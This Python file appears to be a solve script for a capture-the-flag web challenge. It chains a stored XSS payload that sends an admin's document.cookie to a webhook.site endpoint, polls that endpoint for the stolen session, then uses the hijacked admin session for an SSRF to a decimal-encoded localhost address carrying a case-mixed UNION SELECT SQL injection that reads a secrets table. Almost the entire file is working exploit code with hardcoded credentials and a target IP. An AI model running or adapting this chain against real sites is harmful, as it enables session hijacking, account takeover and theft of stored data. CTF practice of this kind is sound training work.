#!/usr/bin/env python3
# /// script
# requires-python = ">=3.11"
# dependencies = ["requests>=2.32.0"]
# ///

import argparse
import hashlib
import pathlib
import re
import time
import uuid

import requests

HERE = pathlib.Path(__file__).resolve().parent
CHALLENGE = HERE.parent / "files" / "bankroll.zip"
EXPECTED_SHA1 = "f6b988bd555b24b9de9b17401e76886f913e233b"
DEFAULT_BASE = "http://23.179.17.92:5000"
WEBHOOK_API = "https://webhook.site/token/{token}/requests?sorting=newest"
USERNAME = "zack"
PASSWORD = "ryLis@1024"
SSRF_URL = (
    "http://2130706433:8080/search?"
    "q=%27%20UnIoN%20SeLeCt%201,secret,3,4%20FrOm%20secrets/*"
)


def verify_sha1(path: pathlib.Path) -> None:
    digest = hashlib.sha1(path.read_bytes()).hexdigest()
    if digest != EXPECTED_SHA1:
        raise SystemExit(f"sha1 mismatch: {digest}")


def build_xss_payload(webhook_token: str, nonce: str) -> str:
    payload = (
        f"<svg onload =location='//webhook.site/{webhook_token}"
        f"?n={nonce}&c='+document.cookie>"
    )
    if len(payload) > 250:
        raise SystemExit(f"payload too long: {len(payload)}")
    return payload


def login_user(base: str) -> requests.Session:
    session = requests.Session()
    response = session.post(
        f"{base}/login",
        json={"username": USERNAME, "password": PASSWORD},
        timeout=10,
    )
    response.raise_for_status()
    data = response.json()
    if data.get("status") != "ok":
        raise SystemExit(f"login failed: {data}")
    return session


def post_note(session: requests.Session, base: str, payload: str) -> None:
    response = session.post(
        f"{base}/notes",
        json={"content": payload},
        timeout=10,
    )
    response.raise_for_status()
    data = response.json()
    if data.get("status") != "ok":
        raise SystemExit(f"note post failed: {data}")


def get_webhook_requests(webhook_token: str) -> list[dict]:
    response = requests.get(
        WEBHOOK_API.format(token=webhook_token),
        timeout=10,
    )
    response.raise_for_status()
    return response.json().get("data", [])


def wait_for_admin_cookie(
    webhook_token: str,
    nonce: str,
    timeout: int,
    poll_interval: float,
) -> str:
    deadline = time.time() + timeout
    while time.time() < deadline:
        for item in get_webhook_requests(webhook_token):
            query = item.get("query") or {}
            if query.get("n") != nonce:
                continue
            cookie = query.get("c", "")
            if cookie.startswith("session="):
                return cookie.split("=", 1)[1]
        time.sleep(poll_interval)
    raise SystemExit("timed out waiting for admin cookie")


def confirm_admin(base: str, admin_cookie: str) -> None:
    response = requests.get(
        f"{base}/dashboard",
        cookies={"session": admin_cookie},
        timeout=10,
    )
    response.raise_for_status()
    body = response.text
    if "Welcome back, svc_admin" not in body or "role-badge admin" not in body:
        raise SystemExit("stolen cookie is not an active admin session")


def fetch_flag(base: str, admin_cookie: str) -> str:
    response = requests.post(
        f"{base}/devtools/fetch",
        json={"url": SSRF_URL},
        cookies={"session": admin_cookie},
        timeout=15,
    )
    response.raise_for_status()
    body = response.json().get("body", "")
    match = re.search(r"CIT\{[^}]+\}", body)
    if not match:
        raise SystemExit("flag not found in devtools response")
    return match.group(0)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("base", nargs="?", default=DEFAULT_BASE)
    parser.add_argument("--webhook-token", required=True)
    parser.add_argument("--timeout", type=int, default=90)
    parser.add_argument("--poll-interval", type=float, default=2.0)
    args = parser.parse_args()

    verify_sha1(CHALLENGE)
    nonce = uuid.uuid4().hex[:12]
    payload = build_xss_payload(args.webhook_token, nonce)

    user_session = login_user(args.base)
    post_note(user_session, args.base, payload)
    admin_cookie = wait_for_admin_cookie(
        args.webhook_token,
        nonce,
        args.timeout,
        args.poll_interval,
    )
    confirm_admin(args.base, admin_cookie)
    flag = fetch_flag(args.base, admin_cookie)

    print(f"nonce={nonce}")
    print(f"admin_cookie={admin_cookie}")
    print(f"flag={flag}")


if __name__ == "__main__":
    main()
